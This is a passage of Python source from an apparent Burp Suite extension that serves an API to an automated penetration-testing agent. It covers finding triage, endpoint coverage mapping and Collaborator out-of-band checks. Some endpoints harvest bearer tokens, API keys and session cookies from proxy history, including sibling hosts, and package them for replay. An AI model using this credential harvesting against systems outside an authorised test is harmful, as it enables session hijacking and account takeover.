            return
        deleted_sorted = sorted(set([int(i) for i in deleted_indices]), reverse=True)
        with self.extender.agent_queue_lock:
            for q in self.extender.agent_queue:
                old_ids = list(q.get("finding_ids", []))
                if not old_ids:
                    continue
                new_ids = []
                for fid in old_ids:
                    try:
                        fid_int = int(fid)
                    except:
                        continue
                    remove_ref = False
                    shift = 0
                    for deleted_idx in deleted_sorted:
                        if fid_int == deleted_idx:
                            remove_ref = True
                            break
                        if fid_int > deleted_idx:
                            shift += 1
                    if not remove_ref:
                        new_ids.append(fid_int - shift)
                q["finding_ids"] = new_ids
        self.extender._agent_queue_save_pending = True
        self.extender.save_agent_queue()

    def _handle_triage_finding(self, fid):
        try:
            # External IDs are 1-based; convert to internal 0-based index.
            idx = int(fid) - 1
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        if idx < 0:
            self._send_json(400, {"error": "invalid id (must be >= 1)"})
            return
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": str(e)})
            return

        deleted_indices = []
        with self.extender.findings_lock_ui:
            result = self._apply_finding_triage(idx, body)
            if result and result.get("deleted"):
                deleted_indices.append(result.get("internal_index"))
        if result is None:
            self._send_json(404, {"error": "not found"})
            return
        if result.get("error"):
            self._send_json(400, {"error": result.get("error"), "finding": result})
            return
        self._remap_queue_finding_ids_after_delete(deleted_indices)

        self.extender.save_findings()
        self.extender._ui_dirty = True
        if result.get("deleted"):
            self.extender.stdout.println("[AGENT API] deleted %s finding #%d: %s" % (
                result.get("delete_reason", result.get("status", "triaged")),
                idx + 1, self.extender._safe_ascii_text(result.get("deleted_title", ""), 80)))
        else:
            self.extender.stdout.println("[AGENT API] triaged finding #%d: %s/%s" % (
                idx + 1, result.get("status", ""), result.get("priority", "")))
        self._send_json(200, {"status": "ok", "finding": result})

    def _handle_bulk_triage_findings(self):
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": str(e)})
            return

        updates = body.get("updates", [])
        if not isinstance(updates, list):
            self._send_json(400, {"error": "updates must be a list"})
            return

        results = []
        errors = []
        prepared = []
        for update in updates:
            try:
                if not isinstance(update, dict):
                    errors.append({"id": None, "error": "update must be an object"})
                    continue
                raw_id = update.get("id", -1)
                idx = int(raw_id) - 1
                if idx < 0:
                    errors.append({"id": raw_id, "error": "invalid id (must be >= 1)"})
                    continue
                status = self._normalize_agent_status(update.get("status", "untouched"))
                prepared.append((idx, raw_id, status, update))
            except Exception as e:
                update_id = None
                try:
                    update_id = update.get("id", None)
                except:
                    pass
                errors.append({"id": update_id, "error": str(e)})

        non_deletions = [item for item in prepared if not self._triage_status_deletes_finding(item[2])]
        deletions = sorted([item for item in prepared if self._triage_status_deletes_finding(item[2])], key=lambda item: item[0], reverse=True)
        deleted_indices = []

        with self.extender.findings_lock_ui:
            for idx, raw_id, status, update in non_deletions + deletions:
                try:
                    result = self._apply_finding_triage(idx, update)
                    if result is None:
                        errors.append({"id": raw_id, "error": "not found"})
                    elif result.get("error"):
                        errors.append({"id": raw_id, "error": result.get("error")})
                    else:
                        if result.get("deleted"):
                            deleted_indices.append(result.get("internal_index"))
                        results.append(result)
                except Exception as e:
                    errors.append({"id": raw_id, "error": str(e)})

        self._remap_queue_finding_ids_after_delete(deleted_indices)
        self.extender.save_findings()
        self.extender._ui_dirty = True
        deleted_count = sum(1 for result in results if result.get("deleted"))
        self.extender.stdout.println("[AGENT API] bulk triaged %d finding(s), deleted %d finding(s), %d error(s)" % (
            len(results), deleted_count, len(errors)))
        self._send_json(200, {"status": "ok", "updated": results, "errors": errors})

    def _handle_create_finding(self):
        """Create a new finding from agent-discovered vulnerability."""
        try:
            body = self._read_body()
        except Exception as e:
            self._send_json(400, {"error": "invalid body", "message": str(e)})
            return

        # Required fields
        url = body.get("url", "").strip()
        title = body.get("title", "").strip()
        severity = body.get("severity", "Information")
        confidence = body.get("confidence", "Tentative")

        if not url or not title:
            self._send_json(400, {"error": "missing required fields", "required": ["url", "title"]})
            return

        # Optional triage flags
        agent_status = body.get("agent_status", "valid")
        agent_priority = body.get("agent_priority", "P2")
        agent_rationale = body.get("agent_rationale", "Discovered during active testing")
        active_test_recipe = self.extender._normalize_active_test_recipe(
            body.get("active_test_recipe", {}),
            {
                "title": title,
                "url": url,
                "severity": severity,
                "agent_status": agent_status,
                "agent_priority": agent_priority,
                "agent_rationale": agent_rationale
            }
        )

        # Create the finding via extender
        self.extender.add_finding(
            url=url,
            title=title,
            severity=severity,
            confidence=confidence,
            detail=body.get("detail", ""),
            cwe=body.get("cwe", ""),
            evidence=body.get("evidence", ""),
            remediation=body.get("remediation", ""),
            owasp=body.get("owasp", ""),
            ai_confidence=body.get("ai_confidence", 0),
            request_data=body.get("request_data"),
            response_data=body.get("response_data"),
            agent_status=agent_status,
            agent_priority=agent_priority,
            agent_rationale=agent_rationale,
            active_test_recipe=active_test_recipe
        )

        # Update the last finding's triage status if specified
        with self.extender.findings_lock_ui:
            if self.extender.findings_list:
                last_finding = self.extender.findings_list[-1]
                last_finding["agent_status"] = agent_status
                last_finding["agent_priority"] = agent_priority
                last_finding["agent_rationale"] = agent_rationale
                last_finding["active_test_recipe"] = active_test_recipe
                last_finding["agent_updated_at"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        self.extender.save_findings()
        self.extender._ui_dirty = True

        # Get the ID of the newly created finding (external IDs are 1-based)
        with self.extender.findings_lock_ui:
            new_idx = len(self.extender.findings_list) - 1
        new_id = new_idx + 1

        self.extender.stdout.println("[AGENT API] created finding #%d: %s" % (new_id, title[:80]))
        self._send_json(201, {
            "status": "created",
            "id": new_id,
            "url": url,
            "title": title,
            "severity": severity,
            "agent_status": agent_status,
            "agent_priority": agent_priority,
            "active_test_recipe": active_test_recipe
        })

    def _query_value(self, query, name, default=""):
        value = query.get(name, [default])
        if isinstance(value, list):
            if not value:
                return default
            value = value[0]
        try:
            return str(value).strip()
        except:
            return default

    def _header_value(self, headers, name):
        prefix = name.lower() + ":"
        for header in headers:
            text = str(header)
            if text.lower().startswith(prefix):
                return text[len(prefix):].strip()
        return ""

    def _extract_set_cookies(self, headers):
        cookies = []
        for header in headers:
            text = str(header)
            if not text.lower().startswith("set-cookie:"):
                continue
            value = text[len("set-cookie:"):].strip()
            pair = value.split(";", 1)[0]
            if "=" in pair:
                name, cookie_value = pair.split("=", 1)
                cookies.append({
                    "name": name.strip(),
                    "value": cookie_value.strip(),
                    "header": value
                })
        return cookies

    def _extract_cookie_pairs(self, cookie_header):
        cookies = []
        for part in cookie_header.split(";"):
            if "=" not in part:
                continue
            name, value = part.split("=", 1)
            name = name.strip()
            value = value.strip()
            if name:
                cookies.append({"name": name, "value": value})
        return cookies

    def _cookie_header_from_pairs(self, cookies):
        pairs = []
        for cookie in cookies or []:
            try:
                name = str(cookie.get("name", "")).strip()
                value = str(cookie.get("value", "")).strip()
                if name and value:
                    pairs.append("%s=%s" % (name, value))
            except:
                pass
        return "; ".join(pairs)

    def _auth_value_is_usable(self, name, value):
        value_s = str(value or "").strip()
        if not value_s:
            return False
        lower = value_s.lower()
        empty_values = set(["bearer", "bearer ", "bearer null", "bearer undefined",
                            "bearer none", "bearer nil", "null", "undefined", "none"])
        if lower in empty_values:
            return False
        if name and str(name).strip().lower() == "authorization":
            if lower.startswith("bearer") and len(value_s.split(None, 1)) < 2:
                return False
        return True

    def _extract_auth_headers(self, headers):
        interesting = []
        interesting_names = set([
            "authorization", "proxy-authorization", "x-api-key", "api-key",
            "x-auth-token", "x-access-token", "x-id-token", "x-session-token",
            "x-csrf-token", "x-xsrf-token", "csrf-token", "x-csrftoken",
            "x-request-verification-token", "requestverificationtoken"
        ])
        for header in headers:
            text = str(header)
            if ":" not in text:
                continue
            name, value = text.split(":", 1)
            name_l = name.strip().lower()
            if name_l in interesting_names or "csrf" in name_l or "token" in name_l:
                if self._auth_value_is_usable(name, value):
                    interesting.append({"name": name.strip(), "value": value.strip()})
        return interesting

    def _build_recommended_auth(self, credentials):
        """Build a ready-to-use auth block from newest usable same-host history."""
        headers = []
        cookie_by_name = {}
        source_history = []
        source_hosts = []

        for cred in credentials:
            try:
                history_index = cred.get("history_index")
                cred_host = str(cred.get("host", "")).strip()
                request_auth = cred.get("request_auth", {})
                response_auth = cred.get("response_auth", {})

                if not headers:
                    for header in request_auth.get("headers", []):
                        name = str(header.get("name", "")).strip()
                        value = str(header.get("value", "")).strip()
                        if self._auth_value_is_usable(name, value):
                            headers.append({"name": name, "value": value})

                for cookie in request_auth.get("cookies", []):
                    name = str(cookie.get("name", "")).strip()
                    value = str(cookie.get("value", "")).strip()
                    if name and value and name not in cookie_by_name:
                        cookie_by_name[name] = value

                for cookie in response_auth.get("set_cookies", []):
                    name = str(cookie.get("name", "")).strip()
                    value = str(cookie.get("value", "")).strip()
                    if name and value and name not in cookie_by_name:
                        cookie_by_name[name] = value

                if history_index is not None and (request_auth.get("headers") or request_auth.get("cookies") or response_auth.get("set_cookies")):
                    source_history.append(history_index)
                if cred_host and cred_host not in source_hosts:
                    source_hosts.append(cred_host)
            except:
                continue

        cookies = [{"name": name, "value": cookie_by_name[name]} for name in cookie_by_name]
        cookie_header = self._cookie_header_from_pairs(cookies)
        header_lines = []
        for header in headers:
            header_lines.append("%s: %s" % (header.get("name", ""), header.get("value", "")))
        if cookie_header:
            header_lines.append("Cookie: " + cookie_header)

        return {
            "usable": bool(headers or cookie_header),
            "headers": headers,
            "cookies": cookies,
            "cookie_header": cookie_header,
            "raw_header_lines": header_lines,
            "source_history_indices": source_history[:10],
            "source_hosts": source_hosts[:10],
            "note": "Use raw_header_lines or cookie_header for the next retry. Empty Bearer placeholders are ignored."
        }

    def _host_related_suffix(self, host):
        parts = [p for p in str(host or "").lower().split(".") if p]
        if len(parts) < 3:
            return str(host or "").lower()
        host_l = ".".join(parts)
        if host_l.endswith(".nsw.gov.au") and len(parts) >= 5:
            return ".".join(parts[-5:])
        if host_l.endswith(".gov.au") and len(parts) >= 4:
            return ".".join(parts[-4:])
        if (host_l.endswith(".com.au") or host_l.endswith(".net.au") or
                host_l.endswith(".org.au") or host_l.endswith(".edu.au")) and len(parts) >= 3:
            return ".".join(parts[-3:])
        return ".".join(parts[-3:])

    def _host_matches_auth_scope(self, entry_host, host_filter, related_suffix, include_related):
        entry_host = str(entry_host or "").lower()
        host_filter = str(host_filter or "").lower()
        if entry_host == host_filter or entry_host.endswith("." + host_filter):
            return "exact"
        if include_related and related_suffix:
            if entry_host == related_suffix or entry_host.endswith("." + related_suffix):
                return "related"
        return ""

    def _get_latest_auth_payload(self, host_filter, path_contains="", include_related=True, limit=50):
        host_filter = str(host_filter or "").strip().lower()
        if not host_filter:
            return 400, {"error": "host query parameter is required"}

        path_contains = str(path_contains or "").strip()
        related_suffix = self._host_related_suffix(host_filter) if include_related else ""
        if limit < 1:
            limit = 1
        if limit > 250:
            limit = 250

        try:
            history = self.extender.callbacks.getProxyHistory()
        except Exception as e:
            return 500, {"error": "failed to read proxy history", "message": str(e)}

        credentials = []
        searched = 0
        helpers = self.extender.helpers

        for index in range(len(history) - 1, -1, -1):
            if searched >= limit:
                break
            try:
                entry = history[index]
                service = entry.getHttpService()
                if not service:
                    continue
                entry_host = str(service.getHost()).lower()
                match_mode = self._host_matches_auth_scope(entry_host, host_filter, related_suffix, include_related)
                if not match_mode:
                    continue

                req_info = helpers.analyzeRequest(entry)
                url = str(req_info.getUrl())
                if path_contains and match_mode == "exact" and path_contains not in url:
                    continue

                searched += 1
                req_headers = [str(h) for h in req_info.getHeaders()]
                request_cookies = self._extract_cookie_pairs(self._header_value(req_headers, "Cookie"))
                request_auth = {
                    "headers": self._extract_auth_headers(req_headers),
                    "cookies": request_cookies,
                    "cookie_header": self._cookie_header_from_pairs(request_cookies)
                }

                response_auth = {"set_cookies": [], "set_cookie_header": ""}
                response_bytes = entry.getResponse()
                if response_bytes is not None:
                    try:
                        res_info = helpers.analyzeResponse(response_bytes)
                        res_headers = [str(h) for h in res_info.getHeaders()]
                        response_auth["set_cookies"] = self._extract_set_cookies(res_headers)
                        response_auth["set_cookie_header"] = self._cookie_header_from_pairs(response_auth["set_cookies"])
                    except:
                        pass

                if request_auth["headers"] or request_auth["cookies"] or response_auth["set_cookies"]:
                    credentials.append({
                        "history_index": index,
                        "url": url,
                        "method": str(req_info.getMethod()),
                        "host": str(service.getHost()),
                        "host_match": match_mode,
                        "port": int(service.getPort()),
                        "protocol": str(service.getProtocol()),
                        "request_auth": request_auth,
                        "response_auth": response_auth
                    })
            except:
                continue

        self.extender.stdout.println("[AGENT API] auth/latest host=%s searched=%d matches=%d" % (
            host_filter, searched, len(credentials)))
        recommended_auth = self._build_recommended_auth(credentials)
        return 200, {
            "host": host_filter,
            "path_contains": path_contains,
            "include_related": include_related,
            "related_suffix": related_suffix,
            "searched": searched,
            "count": len(credentials),
            "recommended_auth": recommended_auth,
            "guidance": [
                "Prefer recommended_auth.raw_header_lines for the next retry.",
                "If recommended_auth has cookies but no Authorization header, use the Cookie header - live browser sessions are often cookie-based.",
                "Related sibling hosts are searched by default because live app sessions are often on an app host while API calls use an api host.",
                "If no usable auth appears but a live BrowserOS session exists, refresh the relevant BrowserOS page or perform one same-site action while proxied through Burp, then call this endpoint again before asking for tokens."
            ],
            "credentials": credentials
        }

    def _handle_get_latest_auth(self, query):
        host_filter = self._query_value(query, "host", "").lower()
        path_contains = self._query_value(query, "path_contains", "")
        include_related = self._query_value(query, "include_related", "true").lower() not in ("0", "false", "no")
        try:
            limit = int(self._query_value(query, "limit", "50"))
        except:
            limit = 50
        status, payload = self._get_latest_auth_payload(host_filter, path_contains, include_related, limit)
        self._send_json(status, payload)

    def _ensure_collaborator_client(self):
        if self.extender.collaborator is not None:
            return True
        try:
            self.extender.collaborator = self.extender.callbacks.createBurpCollaboratorClient()
            return True
        except Exception:
            try:
                self.extender.collaborator = self.extender.callbacks.createBurpCollaboratorClientContext()
                return True
            except Exception:
                self.extender.collaborator = None
        return False

    def _serialize_collaborator_interaction(self, interaction):
        keys = [
            "type", "client_ip", "time_stamp", "interaction_id", "protocol",
            "query_type", "raw_query", "request", "response",
            "smtp_from", "smtp_to", "conversation", "payload", "payload_id"
        ]
        result = {}
        for key in keys:
            try:
                value = interaction.getProperty(key)
                if value is not None:
                    result[key] = self._limit_text(value, 6000)
            except Exception:
                continue
        if not result:
            try:
                result["raw"] = self._limit_text(str(interaction), 6000)
            except Exception:
                result["raw"] = "unserializable collaborator interaction"
        return result

    def _handle_get_collaborator_interactions(self, query):
        if not self._ensure_collaborator_client():
            self._send_json(503, {
                "error": "Collaborator not available",
                "message": "Burp Collaborator is not available in this Burp edition"
            })
            return

        payload = (
            self._query_value(query, "payload", "") or
            self._query_value(query, "payloadId", "") or
            self._query_value(query, "payload_id", "")
        )
        try:
            try:
                limit = max(1, min(200, int(self._query_value(query, "limit", "100"))))
            except Exception:
                limit = 100

            interactions = None
            if payload:
                interactions = self.extender.collaborator.fetchCollaboratorInteractionsFor(payload)
            else:
                try:
                    interactions = self.extender.collaborator.fetchAllCollaboratorInteractions()
                except Exception:
                    self._send_json(400, {
                        "error": "payload required",
                        "message": "This Burp Collaborator API requires payload or payloadId. Call /api/agent/collaborator first and pass the returned payload."
                    })
                    return

            serialized = []
            for interaction in interactions or []:
                if len(serialized) >= limit:
                    break
                serialized.append(self._serialize_collaborator_interaction(interaction))
            self._send_json(200, {
                "payload": payload,
                "count": len(serialized),
                "interactions": serialized,
                "guidance": "Use this after injecting a generated Collaborator payload to prove blind SSRF, XXE, injection, webhook, or other OOB behavior."
            })
        except Exception as e:
            self._send_json(500, {
                "error": "collaborator interaction fetch failed",
                "message": self._safe_ascii_text(e, 500)
            })

    def _handle_proxy_http_history_regex(self, query):
        regex = self._query_value(query, "regex", "")
        if not regex:
            self._send_json(400, {"error": "regex is required"})
            return
        try:
            pattern = re.compile(regex, re.I | re.M)
        except Exception as e:
            self._send_json(400, {"error": "invalid regex", "message": self._safe_ascii_text(e, 300)})
            return

        try:
            count = max(1, min(500, int(self._query_value(query, "count", "50"))))
        except Exception:
            count = 50
        try:
            offset = max(0, int(self._query_value(query, "offset", "0")))
        except Exception:
            offset = 0
        try:
            preview_limit = max(100, min(8000, int(self._query_value(query, "preview_limit", "1200"))))
        except Exception:
            preview_limit = 1200
        include_request = self._bool_query_value(query, "include_request", "false")
        include_response = self._bool_query_value(query, "include_response", "false")

        try:
            helpers = self.extender.helpers
            history = self.extender.callbacks.getProxyHistory() or []
            matches_seen = 0
            returned = []
            for idx, entry in enumerate(history):
                try:
                    request_bytes = entry.getRequest()
                    if request_bytes is None:
                        continue
                    request_text = helpers.bytesToString(request_bytes)
                    response_bytes = entry.getResponse()
                    response_text = ""
                    if response_bytes is not None:
                        try:
                            response_text = helpers.bytesToString(response_bytes)
                        except Exception:
                            response_text = "[binary response]"

                    req_info = helpers.analyzeRequest(entry)
                    method = str(req_info.getMethod() or "")
                    url = str(req_info.getUrl() or "")
                    search_text = "\n".join([method, url, request_text or "", response_text or ""])
                    if not pattern.search(search_text):
                        continue

                    if matches_seen < offset:
                        matches_seen += 1
                        continue

                    if len(returned) >= count:
                        matches_seen += 1
                        continue

                    item = {
                        "history_index": idx,
                        "method": method,
                        "url": url,
                        "has_response": response_bytes is not None,
                        "request_preview": self._limit_text(request_text, preview_limit)
                    }
                    try:
                        item["request_headers"] = [str(h) for h in req_info.getHeaders()]
                    except Exception:
                        item["request_headers"] = []
                    if response_bytes is not None:
                        try:
                            res_info = helpers.analyzeResponse(response_bytes)
                            item["status_code"] = int(res_info.getStatusCode())
                            item["response_headers"] = [str(h) for h in res_info.getHeaders()]
                        except Exception:
                            item["status_code"] = None
                            item["response_headers"] = []
                        item["response_preview"] = self._limit_text(response_text, preview_limit)
                    if include_request:
                        item["request"] = request_text
                    if include_response and response_bytes is not None:
                        item["response"] = response_text
                    returned.append(item)
                    matches_seen += 1
                except Exception:
                    continue

            self._send_json(200, {
                "regex": regex,
                "offset": offset,
                "count": len(returned),
                "total_matches_seen": matches_seen,
                "history_size": len(history),
                "items": returned,
                "guidance": "Use compact previews for triage and auth recovery; request full bodies only when needed with include_request/include_response."
            })
        except Exception as e:
            self._send_json(500, {
                "error": "proxy history regex search failed",
                "message": self._safe_ascii_text(e, 500)
            })

    def _handle_get_finding(self, fid):
        try:
            # External IDs are 1-based.
            idx = int(fid) - 1
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        if idx < 0:
            self._send_json(400, {"error": "invalid id (must be >= 1)"})
            return
        with self.extender.findings_lock_ui:
            if idx < 0 or idx >= len(self.extender.findings_list):
                self._send_json(404, {"error": "not found"})
                return
            f = dict(self.extender.findings_list[idx])
            base = self._serialize_finding(idx, f, include_full=True)
            base["notes"] = list(f.get("agent_notes", []))
        self._send_json(200, base)

    def _handle_get_coverage(self, query):
        """Cross-reference Burp's site map with findings and queue results.

        Query params:
          host=<host>         - filter to one host (recommended; sitemap can be huge)
          in_scope_only=true  - only include in-scope URLs (default true)
          limit=<n>           - cap returned endpoints (default 500)

        An endpoint is a (METHOD, path-without-query) tuple. We collapse query strings
        because the same path with different params is usually the same endpoint to test.
        Findings and completed queue results are mapped onto their URL's
        (METHOD-from-request, path) when available.
        """
        try:
            try:
                limit = int(query.get("limit", ["500"])[0])
            except:
                limit = 500
            host_filter = (query.get("host", [""])[0] or "").strip().lower()
            in_scope_only = (query.get("in_scope_only", ["true"])[0] or "true").lower() != "false"

            ext = self.extender
            try:
                sitemap = ext.callbacks.getSiteMap(None) or []
            except Exception as e:
                self._send_json(500, {"error": "sitemap unavailable", "message": str(e)})
                return

            # Build endpoint set from sitemap
            endpoints = {}  # key: "METHOD path" -> {url, host, method, path, in_scope, response_count}
            try:
                from java.net import URL as _JavaURL
            except Exception:
                _JavaURL = None

            for item in sitemap:
                try:
                    url_str = str(item.getUrl() or "")
                    if not url_str:
                        continue
                    # Filter by host
                    try:
                        parsed_host = item.getHost() or ""
                    except Exception:
                        parsed_host = ""
                    if host_filter and parsed_host.lower() != host_filter:
                        continue
                    # Scope
                    in_scope = True
                    if in_scope_only and _JavaURL is not None:
                        try:
                            in_scope = bool(ext.callbacks.isInScope(_JavaURL(url_str)))
                        except Exception:
                            in_scope = True
                        if not in_scope:
                            continue
                    # Method & path
                    method = "GET"
                    path_only = url_str
                    try:
                        req_bytes = item.getRequest()
                        if req_bytes:
                            analyzed = ext.helpers.analyzeRequest(item)
                            method = str(analyzed.getMethod() or "GET")
                    except Exception:
                        pass
                    try:
                        from urlparse import urlparse as _urlparse
                    except ImportError:
                        from urllib.parse import urlparse as _urlparse
                    parsed = _urlparse(url_str)
                    path_only = parsed.path or "/"
                    key = "%s %s%s" % (method, parsed_host, path_only)
                    if key not in endpoints:
                        endpoints[key] = {
                            "method": method,
                            "host": parsed_host,
                            "path": path_only,
                            "url_example": url_str,
                            "in_scope": in_scope,
                            "has_response": False,
                            "finding_count": 0,
                            "finding_ids": [],
                            "queue_result_count": 0,
                            "queue_result_ids": [],
                            "queue_outcomes": [],
                            "queue_sources": [],
                        }
                    try:
                        if item.getResponse() is not None:
                            endpoints[key]["has_response"] = True
                    except Exception:
                        pass
                except Exception:
                    continue

            # Map findings onto endpoints
            with ext.findings_lock_ui:
                findings = list(ext.findings_list)

            try:
                from urlparse import urlparse as _urlparse
            except ImportError:
                from urllib.parse import urlparse as _urlparse

            for idx, f in enumerate(findings):
                if f.get("fp"):
                    continue
                furl = str(f.get("url", ""))
                if not furl:
                    continue
                try:
                    fp_parsed = _urlparse(furl)
                except Exception:
                    continue
                fhost = (fp_parsed.hostname or "").lower()
                if host_filter and fhost != host_filter:
                    continue
                fpath = fp_parsed.path or "/"
                # Try to extract method from request_data
                fmethod = "GET"
                req_data = f.get("request_data") or ""
                if req_data:
                    try:
                        first_line = str(req_data).split("\n", 1)[0].strip()
                        parts = first_line.split(" ")
                        if parts and parts[0].isupper() and len(parts[0]) <= 8:
                            fmethod = parts[0]
                    except Exception:
                        pass
                # Match against any method for this path (loose match)
                matched = False
                for key, ep in endpoints.items():
                    if ep["host"].lower() == fhost and ep["path"] == fpath:
                        if ep["method"] == fmethod or fmethod == "GET":
                            ep["finding_count"] += 1
                            ep["finding_ids"].append(idx + 1)  # external 1-based
                            matched = True
                            break
                if not matched:
                    # Endpoint not in sitemap (e.g. agent-discovered) - add synthetic entry
                    key = "%s %s%s" % (fmethod, fhost, fpath)
                    endpoints[key] = {
                        "method": fmethod,
                        "host": fhost,
                        "path": fpath,
                        "url_example": furl,
                        "in_scope": True,
                        "has_response": True,
                        "finding_count": 1,
                        "finding_ids": [idx + 1],  # external 1-based
                        "queue_result_count": 0,
                        "queue_result_ids": [],
                        "queue_outcomes": [],
                        "queue_sources": [],
                        "from": "finding_only",
                    }

            def method_from_request(req_data, default_method):
                method = default_method or "GET"
                if req_data:
                    try:
                        first_line = str(req_data).split("\n", 1)[0].strip()
                        parts = first_line.split(" ")
                        if parts and parts[0].isupper() and len(parts[0]) <= 12:
                            method = parts[0]
                    except Exception:
                        pass
                return method or "GET"

            def endpoint_url_in_scope(url):
                if not in_scope_only or _JavaURL is None:
                    return True
                try:
                    return bool(ext.callbacks.isInScope(_JavaURL(url)))
                except Exception:
                    return True

            def add_queue_endpoint(q, url, method, source):
                url = str(url or "")
                if not url:
                    return
                try:
                    parsed = _urlparse(url)
                except Exception:
                    return
                qhost = (parsed.hostname or "").lower()
                if not qhost:
                    return
                if host_filter and qhost != host_filter:
                    return
                if not endpoint_url_in_scope(url):
                    return
                qpath = parsed.path or "/"
                qmethod = method or "GET"
                matched = False
                for key, ep in endpoints.items():
                    if ep["host"].lower() == qhost and ep["path"] == qpath:
                        if ep["method"] == qmethod or qmethod == "GET":
                            ep["queue_result_count"] = ep.get("queue_result_count", 0) + 1
                            ep.setdefault("queue_result_ids", []).append(q.get("id"))
                            outcome = q.get("outcome", "inconclusive") or "inconclusive"
                            if outcome not in ep.setdefault("queue_outcomes", []):
                                ep["queue_outcomes"].append(outcome)
                            if source and source not in ep.setdefault("queue_sources", []):
                                ep["queue_sources"].append(source)
                            matched = True
                            break
                if not matched:
                    key = "%s %s%s" % (qmethod, qhost, qpath)
                    endpoints[key] = {
                        "method": qmethod,
                        "host": qhost,
                        "path": qpath,
                        "url_example": url,
                        "in_scope": True,
                        "has_response": bool(q.get("response_data") or q.get("status_code")),
                        "finding_count": 0,
                        "finding_ids": [],
                        "queue_result_count": 1,
                        "queue_result_ids": [q.get("id")],
                        "queue_outcomes": [q.get("outcome", "inconclusive") or "inconclusive"],
                        "queue_sources": [source] if source else [],
                        "from": "queue_result",
                    }

            with ext.agent_queue_lock:
                queue_items = [dict(q) for q in ext.agent_queue]

            for q in queue_items:
                if q.get("status") != "completed":
                    continue
                source = q.get("source", "")
                if str(source).startswith("websocket"):
                    continue
                if q.get("flow_requests"):
                    for step in q.get("flow_requests", []):
                        if not isinstance(step, dict):
                            continue
                        step_url = step.get("url", "")
                        step_method = method_from_request(step.get("request_data"), step.get("method", "GET"))
                        add_queue_endpoint(q, step_url, step_method, source or "flow_analysis")
                    continue
                q_url = q.get("url", "")
                q_method = method_from_request(q.get("request_data"), q.get("method", "GET"))
                add_queue_endpoint(q, q_url, q_method, source)

            ep_list = list(endpoints.values())
            for ep in ep_list:
                finding_count = ep.get("finding_count", 0)
                queue_count = ep.get("queue_result_count", 0)
                if finding_count > 0 and queue_count > 0:
                    ep["coverage_status"] = "finding_and_queue_result"
                elif finding_count > 0:
                    ep["coverage_status"] = "finding"
                elif queue_count > 0:
                    ep["coverage_status"] = "queue_result"
                else:
                    ep["coverage_status"] = "untested"

            tested = [e for e in ep_list if e.get("finding_count", 0) > 0 or e.get("queue_result_count", 0) > 0]
            untested = [e for e in ep_list if e.get("finding_count", 0) == 0 and e.get("queue_result_count", 0) == 0]

            # Sort untested with response first (more interesting), capped
            untested.sort(key=lambda e: (not e["has_response"], e["host"], e["path"]))
            tested.sort(key=lambda e: (e["coverage_status"] == "queue_result", -e.get("finding_count", 0), -e.get("queue_result_count", 0), e["host"], e["path"]))

            self._send_json(200, {
                "host_filter": host_filter or None,
                "in_scope_only": in_scope_only,
                "totals": {
                    "endpoints": len(ep_list),
                    "covered": len(tested),
                    "tested": len(tested),
                    "untested": len(untested),
                    "coverage_percent": round(100.0 * len(tested) / len(ep_list), 1) if ep_list else 0.0,
                },
                "untested": untested[:limit],
                "tested": tested[:limit],
                "note": "Endpoints are (METHOD, host, path) - query strings collapsed. 'untested' = no finding and no completed queue result recorded for that endpoint. Completed queue results count as coverage even when the outcome is not-vulnerable, needs-more-info, or inconclusive.",
            })
        except Exception as e:
            self._send_json(500, {"error": "coverage failed", "message": str(e)})

    def _handle_get_report(self):
        """Return live findings.md-style markdown rendered from current findings state."""
        try:
            md = self.extender._build_report_markdown()
            self._send_json(200, {
                "markdown": md,
                "length": len(md),
                "generated_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
        except Exception as e:
            self._send_json(500, {"error": "report build failed", "message": str(e)})

    def _handle_list_queue(self):
        with self.extender.agent_queue_lock:
            items = []
            for q in self.extender.agent_queue:
                next_action = self._queue_operational_metadata(q, [])
                items.append({
                    "id": q.get("id"),
                    "status": q.get("status"),
                    "outcome": q.get("outcome", ""),
                    "created_at": q.get("created_at"),
                    "claimed_at": q.get("claimed_at"),
                    "completed_at": q.get("completed_at"),
                    "result_updated_at": q.get("result_updated_at", ""),
                    "findings_count": len(q.get("finding_ids", [])),
                    "summary": q.get("summary", ""),
                    "browser_verify": bool(q.get("browser_verify", False)),
                    "next_action": next_action
                })
        self._send_json(200, {"queue": items, "count": len(items)})

    def _handle_get_queue_item(self, qid):
        try:
            qid = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        item = self._get_queue_item_snapshot(qid)
        if item is None:
            self._send_json(404, {"error": "not found"})
            return
        # Attach full findings detail. Internal `finding_ids` are 0-based list
        # indices; expose 1-based IDs to the agent for consistency with
        # /api/findings output.
        findings_full = self._queue_findings_full(item)
        item["findings"] = findings_full
        item["finding_ids"] = [fid + 1 for fid in item.get("finding_ids", []) if isinstance(fid, int)]
        item["next_action"] = self._queue_operational_metadata(item, findings_full)
        if item["next_action"].get("recommended_transport") == "curl_proxy":
            status, curl_payload = self._build_queue_curl_payload(item, findings_full, refresh_auth=False)
            if status == 200 and curl_payload.get("commands"):
                item["target_curl"] = curl_payload.get("commands", [])[0]
        # Add reminder so agent doesn't forget about API docs during long sessions
        item["_note_for_agent"] = "For target traffic, call /api/agent/queue/%d/curl?refresh_auth=true and run the generated curl with -x http://127.0.0.1:8080. If you forget API details, call: curl -s /api/docs (public endpoint, no auth required)" % qid
        self._send_json(200, item)

    def _handle_get_queue_curl(self, qid, query):
        try:
            qid_int = int(qid)
        except:
            self._send_json(400, {"error": "invalid id"})
            return
        item = self._get_queue_item_snapshot(qid_int)
        if item is None:
            self._send_json(404, {"error": "not found"})
            return
        findings_full = self._queue_findings_full(item)
        refresh_auth = self._bool_query_value(query, "refresh_auth", "true")
        step_filter = self._query_value(query, "step", "")
        status, payload = self._build_queue_curl_payload(item, findings_full, refresh_auth=refresh_auth, step_filter=step_filter)
        self._send_json(status, payload)

    def _handle_agent_preflight(self, query):
        host_filter = self._query_value(query, "host", "").lower()
        include_auth = bool(host_filter)
        with self.extender.agent_queue_lock:
            pending = sum(1 for q in self.extender.agent_queue if q.get("status") == "pending")
            claimed = sum(1 for q in self.extender.agent_queue if q.get("status") == "claimed")
            total = len(self.extender.agent_queue)
        checks = {
            "api": {"reachable": True, "version": getattr(self.extender, "VERSION", "2.1")},
            "burp_proxy_listener": self._check_tcp_listener("127.0.0.1", 8080),
            "workspace_files": {
